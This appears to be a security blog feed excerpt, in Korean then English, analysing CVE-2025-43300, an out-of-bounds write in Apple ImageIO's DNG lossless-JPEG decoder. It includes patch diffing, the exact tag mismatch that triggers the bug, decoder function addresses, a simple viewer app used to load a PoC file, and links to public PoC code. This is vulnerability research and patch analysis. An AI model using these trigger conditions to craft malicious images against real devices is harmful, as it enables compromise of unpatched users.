&#xBA38;&#xB9AC;&#xB85C; &#xB2E4;&#xC2DC; &#xAC00;&#xBCF4;&#xC8E0;.. &gt;&lt;</p><hr><p>&#xC704;&#xC5D0;&#xC11C; &#xC774;&#xBBF8;&#xC9C0;&#xB098; DNG &#xB4F1;&#xC744; &#xC5EC;&#xB7EC;&#xBC88; &#xC5B8;&#xAE09;&#xD588;&#xC5C8;&#xB294;&#xB370;&#xC694;. &#xB2E4;&#xC74C; &#xB2E8;&#xACC4;&#xB85C; &#xB118;&#xC5B4;&#xAC00;&#xB824;&#xBA74; &#xBC30;&#xACBD; &#xAC1C;&#xB150;&#xC774; &#xD544;&#xC694;&#xD574;&#xC11C; &#xAC04;&#xB2E8;&#xD788; &#xC815;&#xB9AC;&#xD558;&#xACE0; &#xB118;&#xC5B4;&#xAC00;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ol><li><p><strong>&#xC774;&#xBBF8;&#xC9C0; &#xAD00;&#xB828; (&#xD53D;&#xC140; / &#xCC44;&#xB110;(=&#xC0D8;&#xD50C;) / &#xBE44;&#xD2B8; &#xAE4A;&#xC774;)</strong></p><ul><li><strong>&#xD53D;&#xC140;</strong>: &#xC774;&#xBBF8;&#xC9C0;&#xC758; &#xCD5C;&#xC18C; &#xB2E8;&#xC704;.</li><li><p><strong>&#xCC44;&#xB110;(&#xC0D8;&#xD50C;)</strong>: &#xD53D;&#xC140;&#xC744; &#xAD6C;&#xC131;&#xD558;&#xB294; &#xC218;&#xCE58; &#xC131;&#xBD84; 1&#xAC1C;(R, G, B &#xB4F1;).</p><p>  &#x2192; SamplesPerPixel = &#xD53D;&#xC140;&#xB2F9; &#xCC44;&#xB110; &#xC218;</p><p>  &#x2192; BitsPerSample = &#xCC44;&#xB110; &#xD558;&#xB098;&#xB97C; &#xBA87; &#xBE44;&#xD2B8;&#xB85C; &#xD45C;&#xD604;&#xD558;&#xB294;&#xC9C0;(&#xC815;&#xBC00;&#xB3C4;)</p></li><li><p>&#xC608;&#xC2DC;</p><ul><li>Grayscale: SamplesPerPixel=1, BitsPerSample=8 &#x2192; &#xD53D;&#xC140;&#xB2F9; 1&#xBC14;&#xC774;&#xD2B8;</li><li>RGB 8bpc: SamplesPerPixel=3, BitsPerSample=8 &#x2192; &#xD53D;&#xC140;&#xB2F9; 3&#xBC14;&#xC774;&#xD2B8;</li><li>RGBA 16bpc: SamplesPerPixel=4, BitsPerSample=16 &#x2192; &#xD53D;&#xC140;&#xB2F9; 8&#xBC14;&#xC774;&#xD2B8;</li></ul><p>&#x2192; <strong>&#xC774; &#xBA54;&#xD0C0;&#xAC12;&#xB4E4;&#xB85C; &#xBC84;&#xD37C; &#xD06C;&#xAE30;/stride/&#xB8E8;&#xD504; &#xACBD;&#xACC4;</strong>&#xB97C; &#xACC4;&#xC0B0;&#xD569;&#xB2C8;&#xB2E4;.</p></li></ul></li><li><p><strong>DNG</strong> </p><ul><li><strong>Adobe&#xAC00; &#xB9CC;&#xB4E0; RAW &#xC774;&#xBBF8;&#xC9C0; &#xCEE8;&#xD14C;&#xC774;&#xB108; &#xD3EC;&#xB9F7;&#xC785;&#xB2C8;&#xB2E4;</strong>. &#xB0B4;&#xBD80;&#xB294; &#xC0AC;&#xC2E4;&#xC0C1; <strong>TIFF/EP &#xAE30;&#xBC18;</strong>&#xC774;&#xB77C; &#xD0DC;&#xADF8;(&#xBA54;&#xD0C0;&#xB370;&#xC774;&#xD130;)&#xB85C; &#xAD6C;&#xC870;&#xAC00; &#xD45C;&#xD604;&#xB418;&#xACE0;, &#xCE74;&#xBA54;&#xB77C; &#xC13C;&#xC11C;&#xAC00; &#xBC49;&#xC740; &#xAC00;&#xACF5; &#xC804; &#xC6D0;&#xC2DC; &#xB370;&#xC774;&#xD130;(&#xBCA0;&#xC774;&#xC5B4;/CFA &#xB4F1;)&#xC640; &#xC378;&#xB124;&#xC77C;, &#xC0C9; &#xBCF4;&#xC815; &#xC815;&#xBCF4; &#xB4F1;&#xC744; &#xD55C; &#xD30C;&#xC77C;&#xC5D0; &#xB2F4;&#xC2B5;&#xB2C8;&#xB2E4;.</li><li>&#xB370;&#xC774;&#xD130; &#xB2E8;&#xC704;: <strong>Strips, Tiles</strong></li><li>&#xAD00;&#xB828; &#xD575;&#xC2EC; &#xD0DC;&#xADF8;<ul><li>&#xD06C;&#xAE30; &#xACC4;&#xC5F4;: RowsPerStrip &#xB610;&#xB294; TileWidth/TileLength</li><li>&#xC704;&#xCE58;/&#xD06C;&#xAE30;: StripOffsets/TileOffsets, StripByteCounts/TileByteCounts</li><li>&#xD53D;&#xC140; &#xD3EC;&#xB9F7;: SamplesPerPixel, BitsPerSample, (&#xD544;&#xC694; &#xC2DC; PlanarConfiguration &#xB4F1;)</li></ul></li></ul></li></ol><p><strong>&#x2192;</strong> Offsets/ByteCounts&#xB97C; &#xC77D;&#xACE0;, BytesPerRow(stride) &#xACC4;&#xC0B0;&#xC744; &#xD1B5;&#xD574; &#xC5B4;&#xB514;&#xC5D0; &#xC5BC;&#xB9C8;&#xB098; &#xC4F8;&#xC9C0;&#xB97C; &#xC815;&#xD569;&#xB2C8;&#xB2E4;.</p><ol><li><p><strong>RAW / &#xC555;&#xCD95;</strong></p><ul><li><p>RAW&#xB294; &#xCE74;&#xBA54;&#xB77C; &#xC13C;&#xC11C;&#xC5D0;&#xC11C; &#xB098;&#xC628; &#xAC00;&#xACF5; &#xC804; &#xB370;&#xC774;&#xD130;&#xB77C; &#xBCF4;&#xD1B5; 12/14/16bpp &#xAC19;&#xC740; &#xB192;&#xC740; &#xBE44;&#xD2B8; &#xC2EC;&#xB3C4;(&#xB300;&#xAC1C; CFA &#xBCA0;&#xC774;&#xC5B4;&#xB77C; &#xD53D;&#xC140;&#xB2F9; 1 &#xC0D8;&#xD50C;)&#xB97C; &#xAC16;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xC6A9;&#xB7C9;&#xC774; &#xD07D;&#xB2C8;&#xB2E4;. &#xADF8;&#xB798;&#xC11C; DNG&#xB294; &#xBE44;&#xC555;&#xCD95;&#xB3C4; &#xD5C8;&#xC6A9;&#xD558;&#xC9C0;&#xB9CC;, &#xC2E4;&#xC81C;&#xB860; &#xBB34;&#xC190;&#xC2E4; &#xC555;&#xCD95;(&#xC608;: Lossless JPEG, Deflate)&#xC73C;&#xB85C; &#xC800;&#xC7A5;&#xD558;&#xB294; &#xACBD;&#xC6B0;&#xAC00; &#xB9CE;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ul><li>Compression=1 &#x2192; &#xBE44;&#xC555;&#xCD95;</li><li><strong>Compression=7 &#x2192; JPEG (Baseline DCT &#xB610;&#xB294; Lossless JPEG(SOF3))</strong></li><li>Compression=8 &#x2192; Deflate/ZIP</li><li>Compression=34892 &#x2192; Baseline DCT JPEG (lossy)</li></ul><p>&#x2192; &#xC774;&#xBC88; &#xCDE8;&#xC57D;&#xC810;&#xC740; <strong>Lossless JPEG(SOF3)&#xC5D0;&#xC11C; &#xBC1C;&#xC0DD;</strong>&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p></li></ul></li></ol><hr><h2 id="1-3-PoC"><a href="#1-3-PoC" class="headerlink" title="1.3 PoC"></a>1.3 PoC</h2><p><img src="/2025/10/23/clalxk/imageIO_ko/image16.png" alt="image.png"></p><p>&#xBCF4;&#xD1B5;&#xC758; DNG &#xD30C;&#xC77C;&#xB85C;&#xB294; &#xCDE8;&#xC57D;&#xC810;&#xAE4C;&#xC9C0; &#xB3C4;&#xB2EC;&#xD558;&#xC9C0; &#xBABB;&#xD569;&#xB2C8;&#xB2E4;. &#xD558;&#xC9C0;&#xB9CC; &#xBA54;&#xD0C0; &#xD0DC;&#xADF8;(SamplesPerPixel) &#xC870;&#xC815; &#xB4F1;&#xC73C;&#xB85C; &#xADF8; &#xAC80;&#xC99D; &#xAD6C;&#xAC04;&#xC744; &#xD1B5;&#xACFC;&#xD558;&#xBA74;, &#xCDE8;&#xC57D;&#xD55C; &#xD568;&#xC218;&#xAC00; &#xC2E4;&#xC81C;&#xB85C; &#xD638;&#xCD9C;&#xB418;&#xB294; &#xACBD;&#xB85C;&#xB97C; &#xC2E4;&#xD589;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xADF8;&#xB7FC; &#xC9C0;&#xAE08;&#xAE4C;&#xC9C0; &#xBD84;&#xC11D;&#xD55C; &#xB0B4;&#xC6A9;&#xC744; &#xAE30;&#xBC18;&#xC73C;&#xB85C; &#xC81C; &#xD578;&#xB4DC;&#xD3F0;&#xC5D0;&#xC11C; &#xC2E4;&#xD589;&#xD574;&#xBCF4;&#xB3C4;&#xB85D; &#xD558;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC774;&#xB54C;&#xB97C; &#xC704;&#xD574; &#xC5C5;&#xB370;&#xC774;&#xD2B8;&#xB97C; &#xC548;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4; (= &#xC6A9;&#xB7C9;&#xC5C6;&#xC74C;) </p><p><img src="/2025/10/23/clalxk/imageIO_ko/image17.png" alt="image.png"></p><p>&#xC81C; &#xBC84;&#xC804;&#xC740; 18.1.1 &#xC785;&#xB2C8;&#xB2E4;. </p><p><img src="/2025/10/23/clalxk/imageIO_ko/image18.png" alt="image.png"></p><p>&#xC6B0;&#xC120; DNG &#xD30C;&#xC77C;&#xC744; &#xC5F4; DNGViewer&#xB97C; &#xAC04;&#xB2E8;&#xD558;&#xAC8C; &#xAD6C;&#xD604;&#xD558;&#xC5EC; &#xC0AC;&#xC6A9;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c"><span class="hljs-keyword">import</span> SwiftUI<span class="hljs-keyword">import</span> UniformTypeIdentifiers<span class="hljs-keyword">import</span> Combine<span class="hljs-keyword">import</span> UIKit<span class="hljs-keyword">import</span> CoreImage<span class="hljs-keyword">import</span> CoreImage.CIFilterBuiltins@main<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">DNGViewerApp</span>:</span> App {    var body: some Scene {        WindowGroup {            ContentView()        }    }}<span class="hljs-keyword">final</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">RawRenderer</span>:</span> ObservableObject {    <span class="hljs-keyword">private</span> let context = CIContext(options: [        .cacheIntermediates: <span class="hljs-literal">false</span>    ])    @Published var image: UIImage?    @Published var <span class="hljs-built_in">log</span>: String = <span class="hljs-string">&quot;&quot;</span>    func render(from url: URL) {        <span class="hljs-built_in">log</span> = <span class="hljs-string">&quot;Loading: \(url.lastPathComponent)\n&quot;</span>                guard let raw = CIRAWFilter(imageURL: url, options: [:]) <span class="hljs-keyword">else</span> {            <span class="hljs-built_in">log</span> += <span class="hljs-string">&quot;CIRAWFilter unavailable or failed to open URL\n&quot;</span>            <span class="hljs-keyword">return</span>        }          guard let ciImage = raw.value(forKey: kCIOutputImageKey) as? CIImage <span class="hljs-keyword">else</span> {            <span class="hljs-built_in">log</span> += <span class="hljs-string">&quot;Failed to get CIImage\n&quot;</span>; <span class="hljs-keyword">return</span>        }        let extent = ciImage.extent.integral        guard let cg = context.createCGImage(ciImage, from: extent) <span class="hljs-keyword">else</span> {            <span class="hljs-built_in">log</span> += <span class="hljs-string">&quot;Failed to create CGImage\n&quot;</span>; <span class="hljs-keyword">return</span>        }        image = UIImage(cgImage: cg)        <span class="hljs-built_in">log</span> += <span class="hljs-string">&quot;Rendered: \(Int(extent.width))&#xD7;\(Int(extent.height))\n&quot;</span>    }}struct ContentView: View {    @StateObject var renderer = RawRenderer()    @State <span class="hljs-keyword">private</span> var showPicker = <span class="hljs-literal">false</span>    var body: some View {        VStack(spacing: <span class="hljs-number">12</span>) {            <span class="hljs-keyword">if</span> let img = renderer.image {                Image(uiImage: img)                    .resizable()                    .scaledToFit()                    .background(Color.black.opacity(<span class="hljs-number">0.05</span>))                    .cornerRadius(<span class="hljs-number">12</span>)                    .padding(.horizontal)            } <span class="hljs-keyword">else</span> {                Text(<span class="hljs-string">&quot;Open a DNG&quot;</span>).foregroundColor(.secondary)                    .padding(.top, <span class="hljs-number">40</span>)            }            HStack {                Button(<span class="hljs-string">&quot;Open DNG&quot;</span>) { showPicker = <span class="hljs-literal">true</span> }                .buttonStyle(.borderedProminent)                Button(<span class="hljs-string">&quot;Clear&quot;</span>) { renderer.image = nil; renderer.<span class="hljs-built_in">log</span> = <span class="hljs-string">&quot;&quot;</span> }                .buttonStyle(.bordered)            }            ScrollView {                Text(renderer.<span class="hljs-built_in">log</span>)                    .font(.system(.caption, design: .monospaced))                    .frame(maxWidth: .infinity, alignment: .leading)                    .padding()                    .background(Color.black.opacity(<span class="hljs-number">0.03</span>))                    .cornerRadius(<span class="hljs-number">8</span>)            }            .frame(maxHeight: <span class="hljs-number">160</span>)            .padding(.horizontal)        }        .sheet(isPresented: $showPicker) {            DocumentPicker { url in                <span class="hljs-keyword">if</span> let url { renderer.render(from: url) }            }        }    }}struct DocumentPicker: UIViewControllerRepresentable {    var onPick: (URL?) -&gt; Void    func makeCoordinator() -&gt; Coordinator { Coordinator(onPick: onPick) }    func makeUIViewController(context: Context) -&gt; UIDocumentPickerViewController {        <span class="hljs-comment">// DNG UTI&#xB294; &#xC804;&#xD1B5;&#xC801;&#xC73C;&#xB85C; &quot;com.adobe.raw-image&quot;.</span>        <span class="hljs-comment">// iOS 14+&#xC5D0;&#xC120; UTType.image(&#xB610;&#xB294; item)&#xB85C; &#xC5F4;&#xC5B4;&#xB3C4; &#xBB34;&#xBC29;.</span>        let vc = UIDocumentPickerViewController(forOpeningContentTypes: [            UTType(importedAs: <span class="hljs-string">&quot;com.adobe.raw-image&quot;</span>), <span class="hljs-comment">// DNG</span>            .image, .item        ])        vc.allowsMultipleSelection = <span class="hljs-literal">false</span>        vc.delegate = context.coordinator        <span class="hljs-keyword">return</span> vc    }    func updateUIViewController(_ uiViewController: UIDocumentPickerViewController, context: Context) {}    <span class="hljs-keyword">final</span> class Coordinator: NSObject, UIDocumentPickerDelegate {        let onPick: (URL?) -&gt; Void        init(onPick: @escaping (URL?) -&gt; Void) { self.onPick = onPick }        func documentPicker(_ controller: UIDocumentPickerViewController, didPickDocumentsAt urls: [URL]) {            onPick(urls.first)        }        func documentPickerWasCancelled(_ controller: UIDocumentPickerViewController) { onPick(nil) }    }}</code></pre><p><img src="/2025/10/23/clalxk/imageIO_ko/image19.png" alt="image.png"></p><p><img src="/2025/10/23/clalxk/imageIO_ko/image21.png" alt="image.png"></p><p><a href="https://www.dpreview.com/sample-galleries/4949897610/pentax-k-3-mark-iii-sample-gallery/1638788346">https://www.dpreview.com/sample-galleries/4949897610/pentax-k-3-mark-iii-sample-gallery/1638788346</a></p><p>&#xC0AC;&#xC6A9;&#xD55C; &#xC774;&#xBBF8;&#xC9C0;&#xC785;&#xB2C8;&#xB2E4;. </p><p>&#xC774; &#xBDF0;&#xC5B4;&#xB85C; poc dng &#xD30C;&#xC77C;&#xC744; &#xB85C;&#xB4DC;&#xD558;&#xBA74;&#xC11C; &#xD655;&#xC778;&#xD55C; &#xB0B4;&#xC6A9;&#xB4E4;&#xC740; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ul><li>CLosslessJpegUnpacker: <code>0x1DD902E78</code></li><li>CDNGLosslessJpegUnpacker: <code>0x1DD95DE88</code></li><li>CDNGLosslessJpegUnpacker::unpackTile: <code>0x1DD95B198</code></li><li>CLosslessJpegRestartUnpacker: <code>0x1DD95F784</code></li></ul><p><strong>&#xD2B8;&#xB9AC;&#xAC70; &#xC870;&#xAC74;</strong>: SOF3(&#xBB34;&#xC190;&#xC2E4;), DHT &#xC874;&#xC7AC;, SOS &#xC720;&#xD6A8;, <strong>BitsPerSample=16</strong>, <strong>SamplesPerPixel=2</strong>, <strong>NumComponents=1</strong></p><p>&#x2018;&#xD53D;&#xC140; &#xB8E8;&#xD504; &#xC870;&#xAC74;&#x2019;&#xC740; <strong>&#xCEF4;&#xD3EC;&#xB10C;&#xD2B8; &#xAC1C;&#xC218;(1)</strong> &#xB97C; &#xAE30;&#xC900;&#xC73C;&#xB85C; &#xC7A1;&#xC544;&#xB193;&#xACE0;, &#xB8E8;&#xD504; &#xB0B4;&#xBD80;&#xC758; &#xC99D;&#xAC00;/&#xC4F0;&#xAE30;&#xB294; <strong>&#xC0D8;&#xD50C; &#xC218;(2)</strong> &#xB97C; &#xAC00;&#xC815;&#xD574; <strong>16&#xBE44;&#xD2B8; &#xD7; 2&#xCC44;&#xB110;</strong>&#xC744; &#xAE30;&#xB85D;&#xD568; &#x2192; &#xD55C; &#xD589;(row)&#xB9C8;&#xB2E4; <strong>&#xC608;&#xC0C1;&#xC758; 2&#xBC30;</strong>&#xB97C; &#xAE30;&#xB85D;&#xD558;&#xC5EC; <strong>OOB Write</strong>&#xAC00; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;. </p><p>&#xC774; &#xB3D9;&#xC791;&#xB4E4;&#xC744; &#xB530;&#xB77C;&#xAC00; &#xBCF4;&#xBA74; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC740; &#xD750;&#xB984;&#xC744; &#xD655;&#xC778; &#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2025/10/23/clalxk/imageIO_ko/image20.png" alt="image.png"></p><ul><li><strong>&#xB9C8;&#xCEE4; &#xD30C;&#xC2F1;</strong>: SOF3(0xFFC0), DHT(0xFFC4), SOS(0xFFDA) &#xD655;&#xC778; &#xBC0F; Huffman &#xD14C;&#xC774;&#xBE14;</li><li><strong>&#xBC84;&#xD37C; &#xACC4;&#xC0B0;/&#xD560;&#xB2F9;</strong>: &#xB300;&#xB7B5; width &#xD7; height &#xD7; SamplesPerPixel(=2) &#xAE30;&#xC900;&#xC73C;&#xB85C; &#xD655;&#xBCF4;</li><li><p><strong>1&#xD53D;&#xC140; &#xB514;&#xCF54;&#xB4DC; &#xD6C4; &#xD589; &#xB2E8;&#xC704; &#xB8E8;&#xD504;</strong></p><ul><li>&#xC0AC;&#xC2E4;&#xC0C1; &#x2018;<strong>&#xCEF4;&#xD3EC;&#xB10C;&#xD2B8; &#xC218; &#x2265; 2&#x2019;</strong></li><li><strong>NumComponents=1</strong>, <strong>SamplesPerPixel=2</strong> &#xC870;&#xD569;</li><li><p>&#xB8E8;&#xD504;&#xC758; &#xC885;&#xB8CC; &#xC870;&#xAC74;&#xC740; &#xCEF4;&#xD3EC;&#xB10C;&#xD2B8;=1&#xC5D0; &#xB9DE;&#xCDB0;&#xC838; &#xC788;&#xC9C0;&#xB9CC;, &#xB0B4;&#xBD80; &#xB3D9;&#xC791;&#xC740; &#xD53D;&#xC140;&#xB9C8;&#xB2E4; 16&#xBE44;&#xD2B8; &#xAC12; &#xB450; &#xAC1C;&#xB97C; &#xC4F0;&#xACE0; &#xD3EC;&#xC778;&#xD130;&#xB97C; 2&#xC0D8;&#xD50C;&#xC529; &#xC774;&#xB3D9;</p><p>&#x2192; &#xACB0;&#xACFC;&#xC801;&#xC73C;&#xB85C; &#xAC01; &#xD589;&#xC5D0;&#xC11C; <strong>2&#xBC30; &#xCD08;&#xACFC; &#xAE30;&#xB85D;</strong> &#x2192; &#xD589; &#xB05D;&#xC744; &#xB118;&#xC5B4; <strong>OOB Write &#xAC00;&#xB2A5;</strong></p></li></ul></li></ul><p>(<code>0x1DD95B198</code> &#x2192; <code>0x1DD95B6C4</code> &#x2192; <code>0x1DD95B8DC</code> ~ <code>0x1DD95B944</code> &#x2192; <code>0x1DD95BCCC</code>  &#xC774;&#xB807;&#xAC8C; &#xB530;&#xB77C;&#xC11C; &#xBD84;&#xC11D;&#xD558;&#xBA74; &#xB429;&#xB2C8;&#xB2E4;. )</p><h3 id="&#xB9C8;&#xBB34;&#xB9AC;"><a href="#&#xB9C8;&#xBB34;&#xB9AC;" class="headerlink" title="&#xB9C8;&#xBB34;&#xB9AC;"></a>&#xB9C8;&#xBB34;&#xB9AC;</h3><p>&#xC815;&#xB9AC;&#xD558;&#xBA74;, CVE-2025-43300&#xC740; <strong>SamplesPerPixel=2 &#x2194; SOF3 NumComponents=1</strong> &#xBD88;&#xC77C;&#xCE58;&#xB85C; &#xC881;&#xAC8C; &#xC7A1;&#xD78C; &#xC0C1;&#xD0DC;&#xC5D0;&#xC11C; <strong>16bpp&#xD7;2&#xCC44;&#xB110;</strong>&#xC744; &#xD589;&#xB9C8;&#xB2E4; &#xC368; &#xBC84;&#xB824; stride&#xB97C; &#xB118;&#xC5B4;&#xAC00;&#xB294; <strong>OOB Write</strong>&#xAC00; &#xD130;&#xC9C0;&#xB294; &#xBB38;&#xC81C;&#xC600;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC774;&#xBC88; &#xAE00;&#xC5D0;&#xC11C;&#xB294; dyld &#xCE90;&#xC2DC; diff&#xC640; vtable &#xD0C0;&#xC785;&#xD654;&#xB97C; &#xD1B5;&#xD574; <strong>CDNGLosslessJpegUnpacker &#x2192; &#xD0C0;&#xC77C; &#xC5B8;&#xD328;&#xCEE4; &#xACBD;&#xB85C;</strong>&#xB97C; &#xBD84;&#xC11D;&#xD558;&#xACE0;, &#xC2E4;&#xC81C; &#xD2B8;&#xB9AC;&#xAC70; &#xC870;&#xAC74; &#xBC0F; &#xD328;&#xD134;&#xC744; &#xD655;&#xC778;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>iOS 18.6.2&#xC5D0;&#xC11C;&#xB294; <strong>CMPhoto+CVPixelBuffer</strong> &#xC804;&#xD658;&#xACFC; <strong>DataSize/stride &#xAC80;&#xC99D;</strong>&#xC744; &#xCD94;&#xAC00;&#xD574; &#xD574;&#xB2F9; &#xACBD;&#xB85C;&#xB97C; &#xCC28;&#xB2E8;&#xD588;&#xC73C;&#xB2C8;, &#xC2E4;&#xC0AC;&#xC6A9; &#xAE30;&#xAE30;&#xB294; 18.6.2 &#xC774;&#xC0C1; &#xC5C5;&#xB370;&#xC774;&#xD2B8;&#xB97C; &#xAD8C;&#xC7A5;&#xD569;&#xB2C8;&#xB2E4;! &#xC800;&#xB3C4; &#xC774;&#xC820;.. &#xC5C5;&#xB370;&#xC774;&#xD2B8;&#xD558;&#xB824;&#xACE0;&#xC694; &#x314B;&#x314B;.. </p><p>&#xC624;&#xB298; &#xC0B4;&#xD3B4;&#xBCF8; &#xCDE8;&#xC57D;&#xC810;&#xC740; &#xC2E4;&#xC81C;&#xB85C; &#xC545;&#xC6A9;&#xB418;&#xC5B4; &#xC774;&#xC288;&#xAC00; &#xC788;&#xC5C8;&#xB358; &#xCDE8;&#xC57D;&#xC810;&#xC774;&#xC5C8;&#xB294;&#xB370;&#xC694;. iOS&#xB97C; &#xCC98;&#xC74C; &#xB514;&#xBC84;&#xAE45;&#xD574;&#xBD10;&#xC11C; &#xB2E4;&#xC18C; &#xC5B4;&#xB824;&#xC6E0;&#xC9C0;&#xB9CC; &#xB098;&#xB984;&#xB300;&#xB85C; &#xD765;&#xBBF8;&#xB85C;&#xC6B4; &#xACFC;&#xC815;&#xC774;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB2E4;&#xC74C;&#xC5D0;&#xB3C4; &#xC5F4;&#xC2EC;&#xD788; &#xACF5;&#xBD80;&#xD574;&#xBCFC;&#xAC8C;&#xC694;~! </p><h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><p><a href="https://github.com/b1n4r1b01/n-days/blob/main/CVE-2025-43300.md">https://github.com/b1n4r1b01/n-days/blob/main/CVE-2025-43300.md</a></p><p><a href="https://blog.quarkslab.com/patch-analysis-of-Apple-iOS-CVE-2025-43300.html">https://blog.quarkslab.com/patch-analysis-of-Apple-iOS-CVE-2025-43300.html</a></p><p><a href="https://github.com/DarkNavySecurity/PoC/tree/main/CVE-2025-43300">https://github.com/DarkNavySecurity/PoC/tree/main/CVE-2025-43300</a></p><p><a href="https://github.com/msuiche/elegant-bouncer">https://github.com/msuiche/elegant-bouncer</a></p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/Research/">Research</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/clalxk/">clalxk</category>
      
      <category domain="https://hackyboiz.github.io/tags/MacOS/">MacOS</category>
      
      <category domain="https://hackyboiz.github.io/tags/CVE-2025-43300/">CVE-2025-43300</category>
      
      <category domain="https://hackyboiz.github.io/tags/ImageIO/">ImageIO</category>
      
      <category domain="https://hackyboiz.github.io/tags/MemoryCorruption/">MemoryCorruption</category>
      
      <category domain="https://hackyboiz.github.io/tags/iOS/">iOS</category>
      
      
      <comments>https://hackyboiz.github.io/2025/10/23/clalxk/imageIO_ko/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[Research] ImageIO: iOS/macOS DNG Image Processing Memory Corruption (En)</title>
      <link>https://hackyboiz.github.io/2025/10/23/clalxk/imageIO_en/</link>
      <guid>https://hackyboiz.github.io/2025/10/23/clalxk/imageIO_en/</guid>
      <pubDate>Thu, 23 Oct 2025 10:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p&gt;&lt;img src=&quot;/2025/10/23/clalxk/imageIO_en/image.png&quot; alt=&quot;image.png&quot;&gt;&lt;/p&gt;
&lt;p&gt;Hello~ After finishing the macOS series, we&amp;#x2019;re back thi</description>
        
      
      
      
      <content:encoded><![CDATA[<p><img src="/2025/10/23/clalxk/imageIO_en/image.png" alt="image.png"></p><p>Hello~ After finishing the macOS series, we&#x2019;re back this time with <strong>ImageIO</strong>.</p><p>On <strong>August 20th</strong>, a vulnerability was discovered in the ImageIO framework used by iOS, macOS, and iPadOS.</p><p>It was reportedly exploited in the wild to target specific individuals &#x2014; let&#x2019;s analyze what kind of vulnerability it was!</p><p>Shall we begin? &#x1F60E;</p><hr><h1 id="0-ImageIO"><a href="#0-ImageIO" class="headerlink" title="0. ImageIO"></a>0. <a href="https://developer.apple.com/documentation/imageio">ImageIO</a></h1><p><strong>ImageIO</strong> is Apple&#x2019;s <strong>image processing framework</strong> used across macOS, iOS, and iPadOS.</p><p>It provides APIs for <strong>reading, writing, accessing metadata, compression, and decoding</strong></p><p>for a wide range of image formats. It serves as the image processing backend for many system apps and features &#x2014; including <strong>Core Graphics</strong>, <strong>Photos</strong>, <strong>Preview</strong>, <strong>Safari</strong>, <strong>Messages</strong>, <strong>AirDrop</strong>, <strong>Mail</strong>, and <strong>iCloud.</strong></p><h1 id="1-CVE-2025-43300"><a href="#1-CVE-2025-43300" class="headerlink" title="1. CVE-2025-43300"></a>1. CVE-2025-43300</h1><p><img src="/2025/10/23/clalxk/imageIO_en/image1.png" alt="image.png"></p><p>This vulnerability is an <strong>Out-of-Bounds Write</strong> in the JPEG Lossless (<code>SOF3</code>) decoder</p><p>(<code>CDNGLosslessJpegUnpacker</code>) of Apple&#x2019;s ImageIO framework, specifically within <strong>RawCamera</strong>.</p><p>It occurs when the DNG file&#x2019;s TIFF tag (<code>SamplesPerPixel</code>) does <strong>not match</strong> the number of components declared in the internal JPEG stream &#x2014; leading to incorrect loop boundaries and thus a buffer overwrite.</p><p>It was patched in <strong>iOS 18.6.2</strong>, released on <strong>August 20, 2025</strong>.</p><ul><li>Vulnerable version: <strong>iOS 18.6.1</strong></li><li>Patched version: <strong>iOS 18.6.2</strong></li></ul><p>We first wanted to identify <strong>where the patch was applied</strong>.</p><p>Using the public project <a href="https://github.com/blacktop/ipsw-diffs/tree/main"><strong>ipsw-diffs</strong></a>,</p><p>we compared the binaries between <strong>18.6.1</strong> and <strong>18.6.2</strong>.</p><p><img src="/2025/10/23/clalxk/imageIO_en/image2.png" alt="image.png"></p><p>Everything else remained unchanged &#x2014; only <strong>RawCamera</strong> was modified.</p><p><strong>RawCamera</strong></p><blockquote><p>/System/Library/CoreServices/RawCamera.bundle/RawCamera</p></blockquote><pre><code class="hljs bash">-1738.140.3.0.0-  __TEXT.__text: 0x1e2d70-  __TEXT.__auth_stubs: 0x1850+1738.140.3.0.11+  __TEXT.__text: 0x1e3470+  __TEXT.__auth_stubs: 0x1870   __TEXT.__objc_methlist: 0x16e4   __TEXT.__const: 0x15326-  __TEXT.__gcc_except_tab: 0x2d440+  __TEXT.__gcc_except_tab: 0x2d588   __TEXT.__oslogstring: 0xec0   __TEXT.__cstring: 0xee23   __TEXT.__dof_RawCamera: 0x8f7-  __TEXT.__unwind_info: 0xb1d0+  __TEXT.__unwind_info: 0xb1e8   __TEXT.__eh_frame: 0x278   __TEXT.__objc_classname: 0x4b9   __TEXT.__objc_methname: 0x3918   __TEXT.__objc_methtype: 0xdd3   __TEXT.__objc_stubs: 0x2da0-  __DATA_CONST.__got: 0x9b0+  __DATA_CONST.__got: 0x9c8   __DATA_CONST.__const: 0x2a18   __DATA_CONST.__objc_classlist: 0x1e0   __DATA_CONST.__objc_catlist: 0x20   __DATA_CONST.__objc_imageinfo: 0x8   __DATA_CONST.__objc_selrefs: 0xcf8   __DATA_CONST.__objc_superrefs: 0xf0-  __DATA_CONST.__objc_arraydata: 0x3948-  __AUTH_CONST.__auth_got: 0xc40+  __DATA_CONST.__objc_arraydata: 0x3950+  __AUTH_CONST.__auth_got: 0xc50   __AUTH_CONST.__const: 0x35978   __AUTH_CONST.__cfstring: 0x18080   __AUTH_CONST.__objc_const: 0x48b0-  __AUTH_CONST.__objc_arrayobj: 0x570-  __AUTH_CONST.__objc_intobj: 0x39f0+  __AUTH_CONST.__objc_arrayobj: 0x588+  __AUTH_CONST.__objc_intobj: 0x3a20   __AUTH_CONST.__objc_doubleobj: 0x480   